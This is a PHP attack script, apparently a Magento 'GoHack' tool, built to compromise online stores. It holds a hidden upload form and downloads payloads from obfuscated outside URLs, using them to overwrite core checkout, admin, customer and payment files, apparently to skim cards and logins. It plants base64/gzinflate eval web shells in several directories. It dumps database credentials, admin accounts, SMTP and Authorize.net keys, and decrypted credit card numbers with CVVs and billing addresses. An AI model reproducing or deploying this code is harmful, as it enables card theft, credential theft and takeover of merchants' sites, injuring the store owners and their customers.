<?php 
/* 
coder : sohai 
*/ 
if(isset($_GET['damn'])){
    echo "<form action='' method='post' enctype='multipart/form-data' name='uper' id='uper'><input type='file' name='file'><input name='_upl' type='submit' id='_upl' value='up'></form>";if($_POST['_upl']=='up') {if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])) {echo '<b>up!!!</b><br><br>';}}
exit;
}
$idn = $_SERVER['DOCUMENT_ROOT'];
$idn = $_SERVER['DOCUMENT_ROOT'];
$CiCi = file_get_contents(base64_decode("aHR0cDovL3BhbGFwdWR1LmNvbS9tYWdlL2Nj"));
$cmd = file_get_contents(base64_decode("aHR0cDovL3Jvbm5pYXNjYWduaS5uZXQvY21kLnR4dA=="));
$cmd2 = file_get_contents(base64_decode("aHR0cDovL3BhbGFwdWR1LmNvbS9tYWdlL2NnaQ=="));
$cmd3 = file_get_contents(base64_decode("aHR0cDovL3BhbGFwdWR1LmNvbS9tYWdlL3g="));
$shell = file_get_contents(base64_decode("aHR0cDovL3Jvbm5pYXNjYWduaS5uZXQvc2hlbGwudHh0"));
$cici1 = file_get_contents(base64_decode("aHR0cDovL3BhbGFwdWR1LmNvbS9tYWdlL29uZQ=="));
$adminlogin = file_get_contents(base64_decode("aHR0cDovL3BhbGFwdWR1LmNvbS9tYWdlL3Nlcw=="));
$customer = file_get_contents(base64_decode("aHR0cDovL3BhbGFwdWR1LmNvbS9tYWdlL2N1cw=="));
$cig = file_get_contents(base64_decode("aHR0cDovL3BhbGFwdWR1LmNvbS9tYWdlL2NvbmZpZw=="));
function AutoBegalON($folder,$isi){
	$idn = $_SERVER['DOCUMENT_ROOT'];
	$nulis = fopen($idn."/".$folder,"w");
	fwrite($nulis, ($isi));
	fclose($nulis);
	if($nulis){
		return $folder." DONE \n";	
	} else {
		return $folder." FAILED \n";
	}
}
	echo "".AutoBegalON("/app/code/core/Mage/Checkout/Model/Type/Onepage.php",$cici1)."<br>";
	echo "".AutoBegalON("/app/code/core/Mage/Admin/Model/Session.php",$adminlogin)."<br>";
	echo "".AutoBegalON("/app/code/core/Mage/Customer/controllers/AccountController.php",$customer)."<br>";
	echo "".AutoBegalON("/app/code/core/Mage/Payment/Model/Method/Cc.php",$CiCi)."<br>"; 
	echo "".AutoBegalON("/js/mage/adminhtml/admin.php",$cmd)."<br>";
	echo "".AutoBegalON("/js/calendar/img.php",$cmd2)."<br>";
	echo "".AutoBegalON("/js/mage/adminhtml/product/composite/x.php",$cmd3)."<br>";
	echo "".AutoBegalON("/skin/install/default/default/images/logo.php",$cmd2)."<br>";
	echo "".AutoBegalON("/js/mage/mag.php",base64_decode("PD9waHAgJGFkZWwgPSAiYmFzZSIuIjY0Ii4iXyIuImRlIi4iY29kZSI7ZXZhbChnemluZmxhdGUoJGFkZWwoJ0RjeEJDb0FnRUFYUXZlQTUwbzN1Sy9Jb0lqTHFnSXlTbitqNDlRN3d3bldHMmFaVzlLUnVDbmVLbFJEekVKQmdtYTBCYy9mK0hpS2NWazVWMkFuQnM1VGg4R0t6OXRBcS9NMEgnKSkpOyA/Pg=="))."<br>";
	echo "".AutoBegalON("/media/wysiwyg/logo.php",base64_decode("PD9waHAgJGFkZWwgPSAiYmFzZSIuIjY0Ii4iXyIuImRlIi4iY29kZSI7ZXZhbChnemluZmxhdGUoJGFkZWwoJ0RjeEJDb0FnRUFYUXZlQTUwbzN1Sy9Jb0lqTHFnSXlTbitqNDlRN3d3bldHMmFaVzlLUnVDbmVLbFJEekVKQmdtYTBCYy9mK0hpS2NWazVWMkFuQnM1VGg4R0t6OXRBcS9NMEgnKSkpOyA/Pg=="))."<br>";
	echo "".AutoBegalON("/js/prototype/windows/themes/mac.php",base64_decode("PD9waHAgJGFkZWwgPSAiYmFzZSIuIjY0Ii4iXyIuImRlIi4iY29kZSI7ZXZhbChnemluZmxhdGUoJGFkZWwoJ0RjeEJDb0FnRUFYUXZlQTUwbzN1Sy9Jb0lqTHFnSXlTbitqNDlRN3d3bldHMmFaVzlLUnVDbmVLbFJEekVKQmdtYTBCYy9mK0hpS2NWazVWMkFuQnM1VGg4R0t6OXRBcS9NMEgnKSkpOyA/Pg=="))."<br>";
	echo "".AutoBegalON("/shell/index.php",base64_decode("PD9waHAgJGFkZWwgPSAiYmFzZSIuIjY0Ii4iXyIuImRlIi4iY29kZSI7ZXZhbChnemluZmxhdGUoJGFkZWwoJ0RjeEJDb0FnRUFYUXZlQTUwbzN1Sy9Jb0lqTHFnSXlTbitqNDlRN3d3bldHMmFaVzlLUnVDbmVLbFJEekVKQmdtYTBCYy9mK0hpS2NWazVWMkFuQnM1VGg4R0t6OXRBcS9NMEgnKSkpOyA/Pg=="))."<br>";
	echo "".AutoBegalON("/includes/config.php",$cig)."<br>";

	$message .= "---------------------------+[ BACKUP ]+----------------------------\n";

	$message .= "~".$_SERVER['HTTP_HOST']."/includes/config.php\n";
	$message .= "~".$_SERVER['HTTP_HOST']."/app/code/core/Mage/Checkout/Model/Type/Onepage.php\n";
	$message .= "~".$_SERVER['HTTP_HOST']."/app/code/core/Mage/Admin/Model/Session.php\n";
	$message .= "~".$_SERVER['HTTP_HOST']."/app/code/core/Mage/Customer/controllers/AccountController.php\n";
	$message .= "~".$_SERVER['HTTP_HOST']."/app/code/core/Mage/Payment/Model/Method/Cc.php\n";
	$message .= "~".$_SERVER['HTTP_HOST']."/js/mage/adminhtml/admin.php\n";
	$message .= "~".$_SERVER['HTTP_HOST']."/skin/install/default/default/images/logo.php\n";
	$message .= "~".$_SERVER['HTTP_HOST']."/js/mage/mage.php\n";
	$message .= "~".$_SERVER['HTTP_HOST']."/js/prototype/windows/themes/mac.php\n";
	$message .= "~".$_SERVER['HTTP_HOST']."/js/calendar/img.php\n";
	$message .= "~".$_SERVER['HTTP_HOST']."/shell/index.php\n";
	$message .= "~".$_SERVER['HTTP_HOST']."/js/calendar/img.php\n";
	$message .= "~".$_SERVER['HTTP_HOST']."/media/wysiwyg/logo.php\n";
	$message .= "~".$_SERVER['HTTP_HOST']."/js/mage/adminhtml/product/composite/x.php\n";
	$message .= "---------------------------+[ END ]+----------------------------\n";
@set_time_limit(0); 

echo'<head> 
<title>GoHack</title> 
</head> 
<div id="page-wrap"> 
<body> 
<style type="text/css"> 
body,table { font-family:verdana;font-size:9px;color:#CCCCCC;background-color:#333333; } 
table { width:100%; border-color:#333333;border-width:0pt 1pt; border-style:solid; } 
td {background-color: #000500; font-family: Courier New; font-size:8pt; color:#999999; border-color:#FFFFFF; border-width:1pt 0pt; border-style:solid; border-collapse:collapse;padding:0pt 3pt;vertical-align:middle;} 
A:Link, A:Visited { color: #999999;    text-decoration: none; } 
A.no:Link, A.no:Visited { text-decoration: none; } 
A:Hover, A:Visited:Hover , A.no:Hover, A.no:Visited:Hover { color: #666666; background-color:#333333; text-decoration: none; } 
input,select,option { font:8pt tahoma;color:#666666;margin:2;border:1px solid #666666; } 
textarea { color:#666666;font:verdana bold;border:1px solid ;margin:2; } 
.fleft { float:left;text-align:left; } 
.fright { float:right;text-align:right; } 
#pagebar { font:8pt tahoma;padding:5px; border:3px solid #333333; border-collapse:collapse; } 
#pagebar td { vertical-align:top; } 
#pagebar p { font:8pt tahoma;} 
#pagebar a { font-weight:bold;color:#666666; } 
#pagebar a:visited { color:#00CE00; } 
#mainmenu { text-align:center; } 
#mainmenu a { text-align: center;padding: 0px 5px 0px 5px; } 
#maininfo,.barheader,.barheader2 { text-align:center; } 
#maininfo td { padding:3px; } 
.barheader { font-weight:bold;padding:5px; } 
.barheader2 { padding:5px;border:2px solid #333333; } 
.contents,.explorer { border-collapse:collapse;} 
.contents td { vertical-align:top; } 
.mainpanel { border-collapse:collapse;padding:5px; } 
.barheader,.mainpanel table,td { border:1px solid #333333; } 
.mainpanel input,select,option { border:1px solid #333333;margin:0; } 
input[type="submit"] { border:1px solid #333333; } 
input[type="text"] { padding:3px;} 
.fxerrmsg { color:red; font-weight:bold; } 
#pagebar,#pagebar p,h1,h2,h3,h4,form { margin:0; } 
#pagebar,.mainpanel,input[type="submit"] { background-color:black; } 
.barheader2,input,select,option,input[type="submit"]:hover { background-color:black; } 
textarea,.mainpanel input,select,option { background-color:#000000; } 
// --> 
</style> 

<body bgcolor="#ffffff" > 

<center> 
<br> 
<FORM action=""  method="post"><h1>
<div align="center"><div><span style="
color:#ff0000;"> </span><span style="color:#ff1200;">G</span><span style="
color:#ff2400;"> </span><span style="color:#ff3600;">O</span><span style="
color:#ff4900;"> </span><span style="color:#ff5b00;">H</span><span style="
color:#ff6d00;"> </span><span style="color:#ff7f00;">A</span><span style="
color:#ff8f00;"> </span><span style="color:#ff9f00;">C</span><span style="
color:#ffaf00;"> </span><span style="color:#ffbf00;">K</span></div></h1><br> 
<div align="center">[M A G E N T O]<br> 
<font color="blue">GorontaloHackerCommunity</font><br><br>
<input type="hidden" name="form_action" value="2"> 
</div>  
'; 


if(file_exists($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml')){ 
    $xml = simplexml_load_file($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml'); 
    if(isset($xml->global->resources->default_setup->connection)) { 
       $connection = $xml->global->resources->default_setup->connection; 
       $prefix = $xml->global->resources->db->table_prefix; 
       $key = $xml->global->crypt->key; //f8cd1881e3bf20108d5f4947e60acfc1 
       require_once $_SERVER['DOCUMENT_ROOT'].'/app/Mage.php'; 
        
       try { 
           $app = Mage::app('default'); 
           Mage::getSingleton('core/session', array('name'=>'frontend')); 
       }catch(Exception $e) { echo 'Message: ' .$e->getMessage()."<br/>\n";} 

       if (!mysql_connect($connection->host, $connection->username, $connection->password)){ 
           print("Could not connect: " . mysql_error()); 
       } 
       mysql_select_db($connection->dbname); 
       echo $connection->host."|".$connection->username."|".$connection->password."|".$connection->dbname."| $prefix | $key<br/>\n"; 

    $crypto = new Varien_Crypt_Mcrypt(); 
    $crypto->init($key); 

    //========================================================================================================= 
    $query = mysql_query("SELECT user_id,firstname,lastname,email,username,password FROM admin_user where is_active = '1'"); 
    if (!$query){ 
          echo "<center><b>Gagal</b></center>"; 
    }else{ 
            $site = mysql_fetch_array(mysql_query("SELECT value as website FROM core_config_data WHERE path='web/unsecure/base_url'")); 
          echo'<br> 
                ====================================================================<br> 
                                [ Admin FROM website : '.$site['website'].'] <br> 
                ====================================================================<br>'; 
    } 
    echo " 
    <table border='1' align='center' > 
    <tr> 
    <td>id</td> 
    <td>firstname</td> 
    <td>lastname</td> 
    <td>email</td> 
    <td>username</td> 
    <td>password</td> 
    </tr>"; 
        while($vx = mysql_fetch_array($query)) { 
        $no = 1; 
        $user_id = $vx['user_id']; 
        $username = $vx['username']; 
        $password = $vx['password']; 
        $email = $vx['email']; 
        $firstname = $vx['firstname']; 
        $lastname = $vx['lastname']; 
        echo "<tr><pre><td>$user_id</td><td>$firstname</td><td>$lastname</td><td>$email</td><td>$username</td><td>$password</td></pre></tr>"; 
        }  
    echo "</table><br>"; 
    //========================================================================================================= 
    $query = mysql_query("SELECT value as user,(SELECT value FROM core_config_data where  path = 'payment/authorizenet/trans_key') as pass FROM core_config_data where path = 'payment/authorizenet/login'"); 
    if(mysql_num_rows($query) != 0){ 
        if (!$query){ 
              echo "<center><b>Gagal</b></center>"; 
        }else{ 
              echo'<br><br> 
                    ====================================================================<br> 
                                    [ Authorizenet ] <br> 
                    ====================================================================<br>'; 
        } 
        echo " 
        <table border='1' align='center' > 
        <tr> 
        <td>no</td> 
        <td>user</td> 
        <td>pass</td>     
        </tr>"; 
            $no = 1; 
            while($vx = mysql_fetch_array($query)) { 
            $user = $crypto->decrypt($vx['user']); 
            $pass = $crypto->decrypt($vx['pass']); 

             
            echo "<tr><pre><td>$no</td><td>$user</td><td>$pass</td></pre></tr>"; 
            $no++; 
            }  
        echo "</table><br>"; 
    } 
    //========================================================================================================= 
    $query_smtp = mysql_query("SELECT (SELECT a.value FROM core_config_data as a WHERE path = 'system/smtpsettings/host') as host , (SELECT b.value FROM core_config_data as b WHERE path = 'system/smtpsettings/port') as port,(SELECT c.value FROM core_config_data as c WHERE path = 'system/smtpsettings/username') as user ,(SELECT d.value FROM core_config_data as d WHERE path = 'system/smtpsettings/password') as pass FROM core_config_data limit 1,1"); 
    if(mysql_num_rows($query_smtp) != 0){ 
        if (!$query_smtp){ 
              echo "<center><b>Gagal</b></center>"; 
        }else{ 
              echo'<br><br> 
                    ====================================================================<br> 
                                    [ SMTP ] <br> 
                    ====================================================================<br>'; 
        } 
        echo " 
        <table border='1' align='center' > 
        <tr> 
        <td>no</td> 
        <td>host</td>         
        <td>port</td> 
        <td>user</td> 
        <td>pass</td>     
        </tr>"; 
            $no = 1; 
            $batas = 0; 
            while($rows = mysql_fetch_array($query_smtp)) { 
                $smtphost = $rows[0]; 
                $smtpport = $rows[1]; 
                $smtpuser = $rows[2]; 
                $smtppass = $rows[3]; 
                echo "<tr><pre><td>$no</td><td>$smtphost</td><td>$smtpport</td><td>$smtpuser</td><td>$smtppass</td></pre></tr>"; 
                $no++; 
            } 
        echo "</table><br>"; 
    } 
    $query = mysql_query("SELECT sfo.updated_at,sfo.cc_owner,sfo.method,sfo.cc_number_enc,sfo.cc_cid_enc,CONCAT(sfo.cc_exp_month,' |',sfo.cc_exp_year) as exp,CONCAT(billing.firstname,' | ',billing.lastname,' | ',billing.street,' | ',billing.city,' | ', billing.region,' | ',billing.postcode,' | ',billing.country_id,' | ',billing.telephone,' |-| ',billing.email) AS 'Billing Address' FROM sales_flat_quote_payment AS sfo JOIN sales_flat_quote_address AS billing ON billing.quote_id = sfo.quote_id AND billing.address_type = 'billing'"); 
    //========================================================================================================= 
    $query2 = mysql_query("SELECT sfo.cc_owner,sfo.method,sfo.cc_number_enc,sfo.cc_cid_status,CONCAT(sfo.cc_exp_month,'|',sfo.cc_exp_year) as exp,CONCAT(billing.firstname,' | ',billing.lastname,' | ',billing.street,' | ',billing.city,' | ', billing.region,' | ',billing.postcode,' | ',billing.country_id,' | ',billing.telephone,' | ',billing.email) AS 'Billing Address' FROM sales_flat_order_payment AS sfo JOIN sales_flat_order_address AS billing ON billing.parent_id = sfo.parent_id AND billing.address_type = 'billing' where cc_number_enc != ''");
    if(mysql_num_rows($query) != 0 || mysql_num_rows($query2) != 0){ 
          echo'<br><br> 
                ====================================================================<br> 
                                [ Credit Card ] <br> 
                ====================================================================<br>'; 
            echo " 
            <table border='1' align='left' > 
            <tr> 
            <td>no</td> 
            <td>Date</td> 
            <td>Credit Owner</td> 
            <td>method</td> 
            <td>Credit Number</td> 
            <td>Credit Exp</td> 
            <td>CVV</td> 
            <td>Address</td> 
            </tr>"; 
                $no = 1; 
                $batas = 0; 
                while($vx = mysql_fetch_array($query)){ 
                $date = $vx['updated_at']; 
                $cc_owner = $vx['cc_owner']; 
                $method = $vx['method']; 
                $cc_number_enc = $crypto->decrypt($vx['cc_number_enc']); 
                $exp = $vx['exp'];         
                $cc_cid_enc = $crypto->decrypt($vx['cc_cid_enc']);     
                $Billing_Address = $vx['Billing Address']; 
                echo "<tr><pre><td>$no</td><td>$date</td><td>$cc_owner</td><td>$method</td><td>$cc_number_enc</td><td>$exp</td><td>$cc_cid_enc</td><td>$Billing_Address</td></pre></tr>"; 
                $batas = $no++; 
                } 
                 
                while($vx2 = mysql_fetch_array($query2)){ 
                    $batas +=1; 
                $cc_owner = $vx2['cc_owner']; 
                $method = $vx2['method']; 
                $cc_number_enc = $crypto->decrypt($vx2['cc_number_enc']); 
                $exp = $vx2['exp'];         
                $cc_cid_status = $crypto->decrypt($vx2['cc_cid_status']); 
                $Billing_Address = $vx2['Billing Address']; 
                echo "<tr><pre><td>$batas</td><td>$cc_owner</td><td>$method</td><td>$cc_number_enc</td><td>$exp</td><td>$cc_cid_status</td><td>$Billing_Address</td></pre></tr>"; 
                 $batas++; 
                }      
                 
            echo "</table><br>";     
    } 
    //========================================================================================================= 
  } 
} 
function save($format,$data){ 
    $fp = fopen($format, 'a'); 
    fwrite($fp, $data); 
    fclose($fp); 
} 
function cekbase64($string){  
        $decoded = base64_decode($string, true); 
        if (!preg_match('/^[a-zA-Z0-9\/\r\n+]*={0,2}$/', $string)) return false; 
        if(!base64_decode($string, true)) return false; 
        if(base64_encode($decoded) != $string) return false; 
        return true;//nilai return 1 jika true 
    } 
//----untuk decode password ---/ 
class Varien_Crypt_Mcrypt{ 
    /** 
     * Constuctor 
     * 
     * @param array $data 
     */ 
    public function __construct() 
    { 
    } 

    /** 
     * Initialize mcrypt module 
     * 
     * @param string $key cipher private key 
     * @return Varien_Crypt_Mcrypt 
     */ 
    public function init($key) 
    { 
        $this->handler = mcrypt_module_open(MCRYPT_BLOWFISH, '', MCRYPT_MODE_ECB, ''); 
        $iv = mcrypt_create_iv (mcrypt_enc_get_iv_size($this->handler), MCRYPT_RAND); 
        $maxKeySize = mcrypt_enc_get_key_size($this->handler); 

        if (iconv_strlen($key, 'UTF-8')>$maxKeySize) { 
            //throw new Varien_Exception('Maximum key size must should be smaller '.$maxKeySize); 
            return null; 
        } 

        mcrypt_generic_init($this->handler, $key, $iv); 

        return $this; 
    } 

    /** 
     * Encrypt data 
     * 
     * @param string $data source string 
     * @return string 
     */ 
    public function encrypt($data) 
    { 
        if (!$this->handler) { 
            //throw new Varien_Exception('Crypt module is not initialized.'); 
            return null; 
        } 
        if (strlen($data) == 0) { 
            return $data; 
        } 
        return base64_encode(mcrypt_generic($this->handler, $data)); 
    } 

    /** 
     * Decrypt data 
     * 
     * @param string $data encrypted string 
     * @return string 
     */ 
    public function decrypt($data) 
    { 
        if (!$this->handler) { 
            //throw new Varien_Exception('Crypt module is not initialized.'); 
            return null; 
        } 
        if (strlen($data) == 0) { 
            return $data; 
        } 
        return mdecrypt_generic($this->handler, base64_decode($data)); 
    } 
         
  
    /** 
     * Desctruct cipher module 
     * 
     */ 
    public function __destruct() 
    { 
        if ($this->handler) { 
            $this->_reset(); 
        } 
    } 

    protected function _reset() 
    { 
        mcrypt_generic_deinit($this->handler); 
        mcrypt_module_close($this->handler); 
    } 
} 



$path = 'ftmp/';
  if ($handle = opendir($path)) {
     while (false !== ($file = readdir($handle))) {
        if ((time()-filectime($path.$file)) < 60) {  
           if (preg_match('/\.pdf$/i', $file)) {
              unlink($path.$file);
           }
        }
     }
   }

?>